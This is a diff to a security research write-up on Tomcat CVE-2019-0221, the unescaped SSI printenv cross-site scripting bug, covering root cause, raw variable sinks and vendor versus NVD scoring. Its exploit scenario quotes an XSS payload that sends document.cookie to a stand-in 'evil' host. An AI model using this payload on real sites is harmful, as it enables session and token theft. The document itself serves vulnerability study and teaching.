@@ -125,10 +125,27 @@ this bug survived roughly 16 years.
 **Affected:** Tomcat 9.0.0.M1–9.0.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. Fixed in 7.0.94 /
 8.5.40 / 9.0.19. CVSS 6.1.
 
-**Root cause.** Tomcat's SSI implementation HTML-escapes values for `#echo` (whose
-`encoding` parameter defaults to `entity`) but `#printenv` dumps every variable with no
-escaping at all. Request-derived variables — `QUERY_STRING`, `HTTP_USER_AGENT`,
-`DOCUMENT_URI` — therefore reach the response body raw.
+> **A full lab and deep-dive for this CVE lives in
+> [`research/cve-2019-0221/`](cve-2019-0221/README.md)** — two Tomcats side by side, a
+> one-command exploit, and browser-verified proof of execution.
+
+**Root cause.** Not a missing escape — a *defaulting* bug. `SSIMediator` has two overloads
+and the convenience one hard-codes the unsafe option:
+
+```java
+public String getVariableValue(String variableName) {
+    return getVariableValue(variableName, "none");   // "none" -> encode() returns it verbatim
+}
+```
+
+`SSIEcho` declares `DEFAULT_ENCODING = "entity"` and passes it through, so `#echo` is safe;
+`SSIPrintenv` called the one-argument overload, so `#printenv` is not. The upstream fix is a
+single line adding `SSIMediator.ENCODING_ENTITY` to that call.
+
+**[verified] The sink is `QUERY_STRING_UNESCAPED`, not `QUERY_STRING`.** Both are printed:
+the first is URL-decoded and lands raw, the second is percent-encoded and is inert. Also raw:
+`HTTP_USER_AGENT`, `HTTP_REFERER`, `HTTP_ACCEPT*`. Arbitrary custom headers are **not**
+exported — `SSIServletExternalResolver` uses a fixed allow-list.
 
 **Exploit scenario.** A `debug.shtml` left in a staging build contains `<!--#printenv -->`.
 The attacker sends `GET /debug.shtml?<script>fetch('//evil/'+document.cookie)</script>`
@@ -137,9 +154,11 @@ origin: session theft, CSRF-token exfiltration, admin actions.
 
 **Discussion angles.** The vendor rated this "low" on three grounds — SSI is off by
 default, almost nobody uses it, and `printenv` is a debugging directive that has no place
-in production. That is a genuinely defensible risk-acceptance argument, and a good thing
-for a team to argue both sides of. It also cleanly illustrates why a per-directive
-encoding default (`entity` on `echo`) is worthless if a sibling directive skips it.
+in production. NVD scored it 6.1. Both are defensible: the vendor is rating the *deployed*
+risk and NVD the *vulnerability*, which is a real and recurring tension in scoring and a
+better angle than picking a side. It also cleanly illustrates why a per-directive encoding
+default (`entity` on `echo`) is worthless if a sibling directive skips it — output encoding
+has to be enforced at the sink, not chosen politely by each caller.
 
 ### 1.4 CVE-2009-1195 — `AllowOverride Options=IncludesNOEXEC` doesn't restrict anything
 
